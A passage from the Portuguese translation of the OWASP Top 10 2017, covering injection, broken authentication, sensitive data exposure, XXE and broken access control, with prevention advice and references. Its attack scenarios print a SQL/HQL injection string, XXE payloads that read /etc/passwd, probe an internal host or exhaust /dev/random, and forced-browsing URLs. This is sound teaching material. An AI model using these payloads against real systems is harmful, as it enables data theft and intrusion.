<p><strong>Cenário #2</strong>: De forma similar, a confiança cega de uma aplicação em frameworks pode resultar em pesquisas que são igualmente vulneráveis, (ex.: Hibernate Query Language (HQL)):</p>
<p><code>Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</code></p>
<p>Em ambos os casos, um atacante modifica o valor do parâmetro 'id' no seu browser para enviar: ' or '1'='1. Por exemplo:</p>
<p><code>https://example.com/app/accountView?id=' or '1'='1</code></p>
<p>Isto altera o significado de ambas as pesquisas para que retornem todos os registros da tabela "accounts". Ataques mais perigosos podem modificar dados ou até invocar stored procedures.</p>
<h2 id="referências-1">Referências</h2>
<h3 id="owasp-1">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c3-secure-database">OWASP Proactive Controls: Parameterize Queries</a></li>
<li><a href="TBA">OWASP ASVS: V5 Input Validation and Encoding</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP Testing Guide: SQL Injection</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">Command Injection</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM injection</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: Injection Prevention</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: SQL Injection Prevention</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html_in_Java">OWASP Cheat Sheet: Injection Prevention in Java</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">OWASP Cheat Sheet: Query Parameterization</a></li>
<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Automated Threats to Web Applications – OAT-014</a></li>
</ul>
<h3 id="externas-1">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564: Hibernate Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917: Expression Language Injection</a></li>
<li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger: Server-side template injection</a></li>
</ul>
<h1 id="a22017-quebra-de-autenticação">A2:2017 Quebra de Autenticação</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 3</td>
<td>Prevalência 2 | Detectabilidade 2</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>Os atacantes têm acesso a centenas de milhões de combinações de nomes de usuário e senha válidos para preenchimento de credenciais, listas de contas administrativas padrão, força bruta automatizada e ferramentas de ataque de dicionário. Os ataques de gerenciamento de sessões são bem compreendidos, particularmente em relação aos tokens de sessão não expirados.</td>
<td>A prevalência de quebra de autenticação é generalizada devido ao design e implementação da maioria dos controles de identidade e de acesso. O gerenciamento de sessões é o base de autenticação e controles de acesso, e está presente em todos os aplicativos que possuem estado. Os atacantes podem detectar a quebra de autenticação usando meios manuais e explorá-los usando ferramentas automatizadas com listas de senhas e ataques de dicionário. </td>
<td>Os atacantes só precisam ter acesso a algumas contas, ou apenas uma conta de administrador para comprometer o sistema. Dependendo do domínio do aplicativo, isso pode permitir lavagem de dinheiro, fraude de CPF e roubo de identidade, ou divulgar informações altamente sensíveis legalmente protegidas.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-1">A Aplicação Está Vulnerável?</h2>
<p>A confirmação da identidade, autenticação e gerenciamento de sessão do usuário é fundamental para proteger contra ataques relacionados à autenticação.</p>
<p>Podem haver pontos fracos de autenticação se a sua aplicação:</p>
<ul>
<li>Permite ataques automatizados, como <a href="https://owasp.org/www-community/attacks/Credential_stuffing">teste exaustivo de credenciais, ou <em>credential stuffing</em></a>, onde o atacante possui uma lista de nomes de usuário e senhas válidos.</li>
<li>Permite ataque de força bruta ou outros ataques automatizados.</li>
<li>Permite senhas padrão, fracas ou bastante conhecidas, como "Password1" ou "admin/admin".</li>
<li>Utiliza processos de recuperação de credenciais ou de recuperação de senhas fracos ou ineficazes, tais como "respostas baseadas em conhecimento", que não podem ser consideradas seguras.</li>
<li>Usa senhas em texto simples, criptografadas ou com hash muito fracos (veja <strong>A3:2017-Exposição de dados sensíveis</strong>).</li>
<li>Não possua autenticação multi-fator ou a mesma não funciona corretamente.</li>
<li>Expõe IDs de sessão na URL (por exemplo, reescrita de URL).</li>
<li>Não rotaciona os IDs de sessão após um login bem-sucedido.</li>
<li>Não invalida devidamente as IDs da Sessão. As sessões de usuário ou os tokens de autenticação (particularmente tokens de single sign-on (SSO)) não são devidamente invalidados durante o logout ou um período de inatividade.</li>
</ul>
<h2 id="como-prevenir-1">Como Prevenir?</h2>
<ul>
<li>Sempre que possível, implemente a autenticação multi-fator para evitar ataques automatizados de preenchimento de credenciais, força bruta e de credenciais roubadas.</li>
<li>Não envie ou implante com quaisquer credenciais padrão, particularmente para usuários administradores.</li>
<li>Implementar verificações de senha fracas, como testar senhas novas ou alteradas em uma lista das <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">Top 10000 piores senhas</a>.</li>
<li>Alinhe o comprimento da senha, a complexidade e as políticas de rotação com as diretrizes do NIST 800-63 B na seção 5.1.1 para <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">Segredos Memorizados</a> ou outras políticas modernas de senha baseadas em evidências.</li>
<li>Assegure-se de que o registro de novas contas, a recuperação de credenciais e os caminhos até as APIs sejam endurecidos contra ataques de enumeração de conta usando as mesmas mensagens para todos os resultados.</li>
<li>Limite ou retarde de forma progressiva as tentativas de login falhadas. Logar todas as falhas e alertar os administradores quando o preenchimento de credenciais, a força bruta, e outros ataques forem detectados.</li>
<li>Use um gerenciador de sessão seguro, no lado do servidor, que gere uma nova ID de sessão aleatória com alta entropia após o login. IDs de sessão não devem estar na URL, e devem ser armazenadas de forma segura e invalidadas após o logout, tempo ocioso e tempo limite absolutos.</li>
</ul>
<h2 id="exemplos-de-cenários-de-ataque-1">Exemplos de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: <a href="https://owasp.org/www-community/attacks/Credential_stuffing">Teste exaustivo de credenciais ou <em>credential stuffing</em></a>, o uso de <a href="https://github.com/danielmiessler/SecLists">listas de senhas conhecidas</a>, é um ataque comum. Se uma aplicação não implementar proteções de ameaças ou de preenchimento automatizados de credenciais, a aplicação pode ser usada como um oráculo de senha para determinar se as credenciais são válidas.</p>
<p><strong>Cenário #2</strong>: A maioria dos ataques de autenticação ocorrem devido ao uso contínuo de senhas como único fator. Uma vez consideradas as melhores práticas, a troca de senha e os requisitos de complexidade são vistos como incentivo aos usuários a usar e reutilizar senhas fracas. As organizações são recomendadas para parar essas práticas por NIST 800-63 e usar autenticação multi-fator.</p>
<p><strong>Cenário #3</strong>: Os tempos limite da sessão da aplicação não estão configurados corretamente. Um usuário usa um computador público para acessar a aplicação. Em vez de selecionar "logout", o usuário simplesmente fecha a guia do navegador e se afasta. Um atacante usa o mesmo navegador uma hora depois e o usuário ainda está autenticado.</p>
<h2 id="referências-2">Referências</h2>
<h3 id="owasp-2">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c6-digital-identity">OWASP Proactive Controls: Implement Identity and Authentication Controls</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: V2 Authentication</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x12-V3-Session-management.md">OWASP Application Security Verification Standard: V3 Session Management</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README">OWASP Testing Guide: Identity</a> and <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README">Authentication</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP Cheat Sheet: Authentication</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: Credential Stuffing</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html">OWASP Cheat Sheet: Forgot Password</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Cheat Sheet: Session Management</a></li>
<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Automated Threats Handbook</a></li>
</ul>
<h3 id="externos">Externos</h3>
<ul>
<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63b: 5.1.1 Memorized Secrets - for thorough, modern, evidence based advice on authentication.</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
</ul>
<h1 id="a32017-exposição-de-dados-sensíveis">A3:2017 Exposição de Dados Sensíveis</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 2</td>
<td>Prevalência 3 | Detectabilidade 2</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>Atacantes tipicamente não quebram criptografia diretamente. Em vez disso, eles roubam as chaves, executam ataques <em>man-in-the-middle</em> ou roubam dados em texto aberto do servidor, enquanto estão em trânsito ou do cliente do usuário, ex.: navegador. Normalmente é necessário um ataque manual. Bancos de dados de senha recuperados anteriormente poderiam ser atacados por força bruta ou quebrados por GPUs.</td>
<td>Ao longo dos últimos anos, este tem sido o ataque impactante mais comum. A falha mais comum é simplesmente não criptografar dados confidenciais. Quando o criptografia é empregada, geração e gerenciamento de chaves fracas, algoritmos, protocolos e usos de cifra fracos são comuns, particularmente para dados em repouso, técnicas de hashing de senha fracas. Para dados em trânsito os pontos fracos do servidor são fáceis de detectar, mas difíceis para os dados em repouso. A explorabilidade de ambos varia.</td>
<td>A falha freqüentemente compromete todos os dados que deveriam ter sido protegidos. Normalmente, essas informações incluem dados de informações pessoais sensíveis (PII) tais como registros de saúde, dados pessoais, dados pessoais, cartões de crédito, que muitas vezes requer proteção conforme definido por leis ou regulamentos, como as leis de privacidade da UE (GDPR) ou as leis locais de privacidade.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-2">A Aplicação Está Vulnerável?</h2>
<p>A primeira coisa é determinar as necessidades de proteção de dados em trânsito e em repouso. Por exemplo, as senhas, números de cartão de crédito, registros de saúde, informações pessoais e segredos comerciais requerem proteção extra, especialmente se esses dados estiverem abrangidos pelas leis de privacidade, ex.: Regulamentação Geral de Proteção de Dados da UE (GDPR), ou regulamentos, ex.: proteção financeira de dados, como PCI Data Security Standard (PCI DSS). Para todos esses dados:</p>
<ul>
<li>Existe algum dado sendo transmitido em texto aberto? Isto diz respeito a qualquer protocolo como http, smtp, ftp. O tráfego de internet externo é especialmente perigoso, mas verifique também todo o tráfego interno, como entre balanceadores de carga, gateways, servidores web ou sistemas back-end.</li>
<li>Algum dados sensível é armazenado em texto aberto, incluindo backups?</li>
<li>Algum algoritmo criptográfico antigo ou fraco é usado por padrão ou em código antigo?</li>
<li>Estão sendo usadas chaves de criptografia padrão, chaves de criptografia fracas geradas ou reutilizadas, ou o falta algum gerenciamento de chaves ou de troca delas?</li>
<li>A criptografia não é aplicada, por exemplo, existe alguma diretiva ou cabeçalho de segurança de <em>user agent</em> (navegador) faltando?</li>
<li>O <em>user agent</em> (por exemplo, aplicativo, cliente de email) não verifica se o certificado recebido do servidor é válido.</li>
</ul>
<p>Ver ASVS <a href="https://owasp.org/www-project-application-security-verification-standard/">Crypto (V6), Data Protection (V8) and SSL/TLS (V9)</a>.</p>
<h2 id="como-prevenir-2">Como Prevenir</h2>
<p>Faça o seguinte, no mínimo, e consulte as referências:</p>
<ul>
<li>Classifique dados processados, armazenados ou transmitidos por uma aplicação. Identifique quais dados são sensíveis de acordo com as leis de privacidade, requisitos regulamentares ou necessidades do negócio.</li>
<li>Aplique controles de acordo com a classificação.</li>
<li>Não armazene dados sensíveis desnecessariamente. Descarte-os o mais rápido possível ou use tokenização compatível com PCI DSS ou mesmo truncamento. Dados que não são retidos não podem ser roubados.</li>
<li>Certifique-se de criptografar todos os dados sensíveis em repouso.</li>
<li>Certifique-se de que os algoritmos, protocolos, chaves e gerenciamento de chaves apropriados estão atualizados e fortes.</li>
<li>Criptografe todos os dados em trânsito com protocolos seguros, como TLS, com cifra <em>perfect forward secrecy</em> (PFS), prioridade de cifra do servidor e parâmetros seguros. Aplique criptografia usando diretivas como HTTP Strict Transport Security (HSTS).</li>
<li>Desativar o cache para respostas que contenham dados confidenciais.</li>
<li>Armazene senhas usando funções de hashing com salt fortes e adaptativas com um fator de trabalho (fator de atraso), como <a href="https://github.com/p-h-c/phc-winner-argon2">Argon2</a>, <a href="https://wikipedia.org/wiki/Scrypt">scrypt</a>, <a href="https://wikipedia.org/wiki/Bcrypt">bcrypt</a> ou <a href="https://wikipedia.org/wiki/PBKDF2">PBKDF2</a>.</li>
<li>Verifique independentemente a eficácia das suas configurações.</li>
</ul>
<h2 id="examplo-de-cenários-de-ataque">Examplo de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: Uma aplicação criptografa números de cartão de crédito em um banco de dados usando criptografia automática do próprio banco. No entanto, esses dados são descriptografados automaticamente quando recuperados, permitindo que uma falha de injeção SQL obtenha números de cartão de crédito em texto aberto.</p>
<p><strong>Cenário #2</strong>: Um site não usa ou aplica TLS para todas as páginas ou suporta criptografia fraca. Um atacante monitora o tráfego de rede, tira o TLS (por exemplo, em uma rede sem fio aberta), intercepta solicitações e rouba o cookie de sessão do usuário. O atacante então reproduz este cookie e seqüestra a sessão (autenticada) do usuário, acessando ou modificando os dados privados do usuário. Em vez do anterior, podem alterar todos os dados transportados, por exemplo, o destinatário de uma transferência de dinheiro.</p>
<p><strong>Cenário #3</strong>: O banco de dados de senhas usa hashes sem salt ou hashes simples para armazenar senhas de todos. Uma falha de upload de arquivo permite que um invasor obtenha o banco de dados de senha. Todos os hashes sem salt podem ser expostos com uma <em>rainbow table</em> de hashes pré-calculados. Hashes gerados por funções de hash simples ou rápidas podem ser quebrados por GPUs, mesmo que possuam salts.</p>
<h2 id="referências-3">Referências</h2>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c8-protect-data-everywhere">OWASP Proactive Controls: Protect Data</a></li>
<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard: V7, 9, 10</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">OWASP Cheat Sheet: Transport Layer Protection</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html">OWASP Cheat Sheet: User Privacy Protection</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP Cheat Sheet: Password Storage</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">OWASP Cheat Sheet: Cryptographic Storage</a></li>
<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Security Headers Project</a>; <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html">Cheat Sheet: HSTS</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README">OWASP Testing Guide: Testing for weak cryptography</a></li>
</ul>
<h3 id="externas-2">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/220.html">CWE-220: Exposure of sens. information through data queries</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310: Cryptographic Issues</a>; <a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Weak Encryption</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Cleartext Storage of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359: Exposure of Private Information - Privacy Violation</a></li>
</ul>
<h1 id="a42017-entidades-externas-de-xml-xml-external-entities---xxe">A4:2017 Entidades Externas de XML (XML External Entities - XXE)</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 2</td>
<td>Prevalência 2 | Detectabilidade 3</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>Atacantes podem explorar processadores XML vulneráveis se eles puderem fazer upload de XML ou incluir conteúdo hostil em um documento XML, explorando código vulnerável, dependências ou integrações.</td>
<td>Por padrão, muitos processadores XML mais antigos permitem a especificação de uma entidade externa, um URI que é desreferenciado e avaliado durante o processamento XML. Ferramentas <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> podem descobrir esse problema inspecionando dependências e configuração. Ferramentas <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> requerem etapas manuais adicionais para detectar e explorar esse problema.</td>
<td>Essas falhas podem ser usadas para extrair dados, executar uma solicitação remota do servidor, escanear sistemas internos, realizar um ataque de negação de serviço e outros ataques. O impacto comercial depende das necessidades de proteção de todas as aplicações e dados afetados.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-3">A Aplicação Está Vulnerável?</h2>
<p>Aplicações e, em particular, serviços Web baseados em XML ou integrações em sistemas legados podem ser vulneráveis a ataques se:</p>
<ul>
<li>Sua aplicação aceita XML diretamente ou uploads de XML, especialmente de fontes não confiáveis, ou insere dados não confiáveis em documentos XML, que é então analisado por um processador XML.</li>
<li>Qualquer um dos processadores XML na aplicação ou serviços web baseados em SOAP tem <a href="https://en.wikipedia.org/wiki/Document_type_definition">definições de tipo de documento (DTDs)</a> habilitados. Como o mecanismo exato para desabilitar o processamento de DTD varia de acordo com o processador, é recomendável consultar uma referência, como <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'XXE Prevention'</a>.</li>
<li>Se sua aplicação usa SAML para processamento de identidade dentro de um sistema de segurança em federação ou de logon único (SSO). SAML usa XML para asserções de identidade e pode ser vulnerável.</li>
<li>Se sua aplicação usa SOAP antes da versão 1.2, provavelmente estará suscetível a ataques XXE se as entidades XML estiverem sendo passadas para o framework SOAP.</li>
<li>Ser vulnerável aos ataques do XXE provavelmente significa que sua aplicação é vulnerável a ataques de negação de serviço, incluindo o ataque de um bilhão de risos (<em>billion laughs attack</em>)</li>
</ul>
<h2 id="como-prevenir-3">Como Prevenir</h2>
<p>Treinamento de desenvolvedor é essencial para identificar e mitigar o XXE. Além disso, a prevenção do XXE exige:</p>
<ul>
<li>Sempre que possível, use um formato de dados menos complicado, como JSON.</li>
<li>Aplique os patches ou atualize todos os processadores e bibliotecas XML em uso pela aplicação ou em seu sistema operacional. Use controladores de dependência. Atualize o SOAP para SOAP 1.2 ou superior.</li>
<li>Desabilite o processamento de DTD e entidade externa XML em todos os analisadores de XML da sua aplicação, de acordo com o <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'XXE Prevention'</a>.</li>
<li>Implementar validação positiva de entrada do lado do servidor ("lista branca"), filtragem ou sanitização para prevenir dados hostis em documentos, cabeçalhos ou nós XML.</li>
<li>Verifique se a funcionalidade de upload de arquivos XML ou XSL valida o XML entrante usando a validação XSD ou similar.</li>
<li>Ferramentas SAST podem ajudar a detectar o XXE no código-fonte, embora a revisão manual do código seja a melhor alternativa em aplicações grandes e complexas com muitas integrações.</li>
</ul>
<p>Se esses controles não forem possíveis, considere a utilização de patches virtuais, gateways de segurança de API, ou WAFs para detectar, monitorar e bloquear ataques de XXE.</p>
<h2 id="examplos-de-cenários-de-ataque">Examplos de Cenários de Ataque</h2>
<p>Numerosos problemas públicos de XXE foram descobertos, incluindo o ataque a dispositivos <em>embedded</em>. O XXE ocorre em muitos lugares inesperados, incluindo dependências profundamente aninhadas. A maneira mais fácil é carregar um arquivo XML malicioso, se aceito:</p>
<p><strong>Cenário #1</strong>: O atacante tenta extrair dados do servidor:</p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
    &lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
<p><strong>Cenário #2</strong>: Um atacante examina a rede privada do servidor alterando a linha ENTITY acima para:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code></pre>
<p><strong>Cenario #3</strong>: Um atacante tenta um ataque de negação de serviço, incluindo um arquivo potencialmente infinito:</p>
<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
<h2 id="referências-4">Referências</h2>
<h3 id="owasp-3">OWASP</h3>
<ul>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection">OWASP Testing Guide: Testing for XML Injection</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP XXE Vulnerability</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: XXE Prevention</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">OWASP Cheat Sheet: XML Security</a></li>
</ul>
<h3 id="externas-3">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611: Improper Restriction of XXE</a></li>
<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs Attack</a></li>
<li><a href="https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html">SAML Security XML External Entity Attack</a></li>
<li><a href="https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a></li>
</ul>
<h1 id="a52017-quebra-de-controle-de-acesso">A5:2017 Quebra de Controle de Acesso</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 2</td>
<td>Prevalência 2 | Detectabilidade 2</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>A exploração do controle de acesso é uma habilidade básica dos atacantes. As ferramentas <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> e <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> podem detectar a ausência de controle de acesso, mas não pode verificar se é funcional quando está presente. O controle de acesso é detectável usando meios manuais, ou possivelmente por automação para a ausência de controles de acesso em certos frameworks.</td>
<td>As vulnerabilidades de controle de acesso são comuns devido à falta de detecção automatizada e à falta de testes funcionais efetivos pelos desenvolvedores de aplicação. A detecção de controle de acesso normalmente não é compatível com testes estáticos ou dinâmicos automatizados.</td>
<td>O impacto técnico são os atacantes que atuam como usuários ou administradores, usuários que usam funções privilegiadas, ou criam, acessam, atualizam ou excluem todos os registros. O impacto comercial depende das necessidades de proteção de sua aplicação e dados.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-4">A Aplicação Está Vulnerável?</h2>
<p>O controle de acesso impõe uma política que os usuários não podem atuar fora das suas permissões pretendidas. As falhas geralmente levam à divulgação não autorizada de informações, modificações ou destruição de todos os dados, ou a realização de uma função de negócio fora dos limites do usuário. As vulnerabilidades comuns de controle de acesso incluem:</p>
<ul>
<li>Contornar verificações de controle de acesso modificando a URL, o estado interno da aplicação ou página HTML, ou simplesmente usando uma ferramenta de ataque de API personalizada.</li>
<li>Permitir que a chave primária seja alterada para o registro de outros usuários, como visualizar ou editar a conta de outra pessoa.</li>
<li>Elevação de privilégio. Atuando como um usuário sem estar logado, ou atuando como um administrador quando conectado como usuário.</li>
<li>Manipulação de metadados, como reproduzir ou adulterar um token de controle de acesso JWT ou um cookie ou campo oculto manipulado para elevar privilégios ou abusar da invalidação JWT.</li>
<li>A configuração errada do CORS permite o acesso não autorizado à API.</li>
<li>Forçar a navegação para páginas autenticadas como um usuário não autenticado ou para páginas privilegiadas como um usuário padrão ou acessando API com controles de acesso ausentes para POST, PUT e DELETE.</li>
</ul>
<h2 id="como-prevenir-4">Como Prevenir</h2>
<p>O controle de acesso só é efetivo se for aplicado no código confiável do servidor ou na API server-less, onde o atacante não pode modificar a verificação de controle de acesso ou os metadados.</p>
<ul>
<li>Com exceção de recursos públicos, negar por padrão.</li>
<li>Implementar mecanismos de controle de acesso uma vez e reutilizá-los durante toda a aplicação, incluindo CORS.</li>
<li>Os controles de acesso ao Model devem impor a posse do registro, em vez de aceitar que o usuário possa criar, ler, atualizar ou excluir qualquer registro.</li>
<li>Requisitos únicos de limites de negócios de aplicações devem ser aplicados por modelos de domínio.</li>
<li>Desative a listagem do diretório do servidor web e assegure-se de que os metadados do arquivo (por exemplo, .git) e os arquivos de backup não estejam presentes na raiz de pastas web.</li>
<li>Registre as falhas de controle de acesso, alerte administradores quando apropriado (por exemplo, falhas repetidas).</li>
<li>Limite a taxa de acesso às APIs e acesso ao controlador para minimizar os danos causados pela ferramentas de ataque automatizados.</li>
<li>Os tokens JWT devem ser invalidados no servidor após o fim de sessão.</li>
<li>Desenvolvedores e funcionários de QA devem incluir testes funcionais de controle de acesso unitários e integrados.</li>
</ul>
<h2 id="exemplo-de-cenários-de-ataque">Exemplo de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: O aplicativo usa dados não verificados em uma chamada SQL que está acessando informações de conta:</p>
<pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
  ResultSet results = pstmt.executeQuery( );</code></pre>
<p>Um atacante simplesmente modifica o parâmetro 'acct' no navegador para enviar qualquer número de conta que eles desejem. Se não for verificado corretamente, o invasor pode acessar a conta de qualquer usuário.</p>
<p><code>https://example.com/app/accountInfo?acct=notmyacct</code></p>
<p><strong>Cenário #2</strong>: Um atacante simplesmente faz uma busca forçada por URLs. Os direitos de administrador são necessários para acessar a página de administração.</p>
<pre><code>  https://example.com/app/getappInfo
  https://example.com/app/admin_getappInfo</code></pre>
<p>Se um usuário não autenticado puder acessar qualquer uma das páginas, é uma falha. Se um não administrador puder acessar a página de administração, isso é uma falha.</p>
<h2 id="referências-5">Referências</h2>
<h3 id="owasp-4">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls">OWASP Proactive Controls: Access Controls</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x12-V4-Access-Control.md">OWASP Application Security Verification Standard: V4 Access Control</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README">OWASP Testing Guide: Authorization Testing</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html">OWASP Cheat Sheet: Access Control</a></li>
</ul>
<h3 id="externas-4">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Improper Access Control (Authorization)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285: Improper Authorization</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">PortSwigger: Exploiting CORS misconfiguration</a></li>
</ul>
<h1 id="a62017-configuração-incorreta-de-segurança">A6:2017 Configuração Incorreta de Segurança</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
